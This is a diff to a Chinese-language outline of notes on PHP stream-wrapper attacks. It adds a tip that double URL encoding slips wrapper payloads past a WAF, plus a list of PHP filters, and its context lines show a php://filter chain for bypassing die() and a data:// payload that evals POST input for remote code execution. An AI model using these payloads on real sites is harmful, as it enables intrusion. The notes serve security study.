@@ -21,6 +21,23 @@
 	- isset 支持 php 伪协议
 	- 绕开死亡`die`
 		- `php://filter/write=string.strip_tags|convert.base64-decode/resource=`
+	- php在解析伪协议时会先urldecode伪协议，所以可以使用二次编码绕过WAF
+	  id:: 64673efa-c544-4ad7-9b9b-920b148d0b26
+	- 所有filter
+		- ```php
+		  zlib.*
+		  convert.iconv.*
+		  string.rot13
+		  string.toupper
+		  string.tolower
+		  string.strip_tags
+		  convert.base64-encode
+		  convert.base64-decode
+		  convert.quoted-printable-encode
+		  convert.quoted-printable-decode
+		  consumed
+		  dechunk
+		  ```
 - `data://`
 	- include无写入文件RCE
 		- `data://text/plain,<?php eval($_POST['data']);?>`
